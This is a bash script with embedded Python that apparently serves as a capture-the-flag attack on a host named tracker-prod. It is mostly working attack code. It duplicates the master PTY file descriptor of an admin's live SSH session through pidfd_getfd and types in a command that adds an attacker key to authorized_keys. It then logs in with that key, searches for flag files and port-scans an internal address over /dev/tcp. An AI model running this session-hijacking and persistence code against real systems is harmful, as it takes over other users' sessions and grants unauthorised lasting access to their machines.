#!/bin/bash

ssh-keygen -t ed25519 -f /tmp/mykey -N "" -q 2>/dev/null || true
PUBKEY=$(cat /tmp/mykey.pub)

ADMIN_SSHD=$(ps aux | grep 'sshd.*admin@pts' | grep -v grep | awk '{print $2}' | head -1)
PRIV_PID=$(ps aux | grep 'sshd: admin \[priv\]' | grep root | grep -v grep | awk '{print $2}' | head -1)
SSH_PID=$(ps aux | grep 'ssh -l admin tracker' | grep -v grep | awk '{print $2}' | head -1)
echo "admin_sshd=$ADMIN_SSHD priv=$PRIV_PID ssh=$SSH_PID"

echo "=== Injecting via pidfd_getfd (true fd dup from sshd) ==="
python3 - <<PYEOF
import ctypes, os, sys

libc = ctypes.CDLL("libc.so.6", use_errno=True)
libc.syscall.restype = ctypes.c_long

# x86_64 syscall numbers
SYS_pidfd_open  = 434
SYS_pidfd_getfd = 438

pubkey = open('/tmp/mykey.pub').read().strip()
cmd = ('\nmkdir -p ~/.ssh; echo "' + pubkey + '" >> ~/.ssh/authorized_keys\n').encode()

import subprocess
ps = subprocess.check_output(['ps', 'aux']).decode()
sshd_pids = []
for line in ps.split('\n'):
    if 'sshd' in line and 'admin' in line and 'grep' not in line:
        try:
            sshd_pids.append(int(line.split()[1]))
        except:
            pass

print(f"Targeting sshd pids: {sshd_pids}")
injected = False

for sshd_pid in sshd_pids:
    try:
        fds = os.listdir(f'/proc/{sshd_pid}/fd')
    except:
        continue

    pidfd = libc.syscall(SYS_pidfd_open, ctypes.c_int(sshd_pid), ctypes.c_int(0))
    if pidfd < 0:
        print(f'pidfd_open({sshd_pid}) failed: errno={ctypes.get_errno()}')
        continue
    print(f'pidfd_open({sshd_pid}) -> pidfd={pidfd}')

    for fd_str in sorted(fds, key=lambda x: int(x)):
        try:
            target = os.readlink(f'/proc/{sshd_pid}/fd/{fd_str}')
        except:
            continue
        if 'ptmx' not in target:
            continue

        fd_num = int(fd_str)
        new_fd = libc.syscall(SYS_pidfd_getfd, ctypes.c_int(pidfd), ctypes.c_int(fd_num), ctypes.c_int(0))
        if new_fd < 0:
            print(f'  pidfd_getfd(fd={fd_num}) failed: errno={ctypes.get_errno()}')
            continue

        print(f'  Got real master PTY fd {new_fd} (from pid={sshd_pid} fd={fd_num})')
        try:
            n = os.write(new_fd, cmd)
            print(f'  Injected {n} bytes!')
            injected = True
        except Exception as e:
            print(f'  write failed: {e}')
        os.close(new_fd)

    os.close(pidfd)
    if injected:
        break

if not injected:
    print("Injection failed, trying ptrace fallback...")
    # ptrace fallback: attach to ssh client, intercept read(), inject data
    import ctypes.util, struct, signal

    PTRACE_ATTACH    = 16
    PTRACE_DETACH    = 17
    PTRACE_GETREGS   = 12
    PTRACE_SETREGS   = 13
    PTRACE_PEEKDATA  = 2
    PTRACE_POKEDATA  = 5
    PTRACE_SYSCALL   = 24
    PTRACE_CONT      = 7

    ssh_pid = None
    for line in ps.split('\n'):
        if 'ssh -l admin tracker' in line and 'grep' not in line:
            try:
                ssh_pid = int(line.split()[1])
            except:
                pass
    if ssh_pid:
        print(f"SSH pid: {ssh_pid}")
        # Just try to write to its stdin fd via /proc/PID/fd/0
        # (pts slave - writing here outputs to terminal, doesn't inject input)
        # But we can try writing to the fd that connects to tracker-prod
        try:
            fds_info = subprocess.check_output(['ls', '-la', f'/proc/{ssh_pid}/fd']).decode()
            print(fds_info)
        except Exception as e:
            print(f"ls failed: {e}")
    else:
        print("ssh pid not found")
PYEOF

echo "=== Waiting for remote command to execute ==="
sleep 4

echo "=== Try SSH with injected key ==="
ssh -i /tmp/mykey -o StrictHostKeyChecking=no -o ConnectTimeout=5 -o BatchMode=yes \
    admin@tracker-prod 'id; cat /flag 2>/dev/null; find / -maxdepth 4 -name "flag*" 2>/dev/null' 2>&1

echo "=== Port scan tracker-prod via bash /dev/tcp ==="
for port in 80 443 8080 8000 3000 5000 8443 9000 9090 6379; do
    timeout 1 bash -c "echo >/dev/tcp/10.0.243.2/$port" 2>/dev/null && echo "OPEN: $port"
done
